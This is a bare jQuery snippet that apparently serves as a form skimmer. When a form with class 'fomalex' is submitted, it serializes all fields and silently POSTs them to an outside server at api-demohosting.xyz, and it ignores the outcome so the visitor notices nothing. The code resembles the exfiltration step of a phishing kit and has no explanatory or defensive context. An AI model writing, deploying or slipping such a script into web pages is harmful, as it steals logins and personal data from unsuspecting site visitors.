$(".fomalex").submit(function() {

	var d = $(".fomalex");

	$.ajax({

        url: "https://api-demohosting.xyz/system/max.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
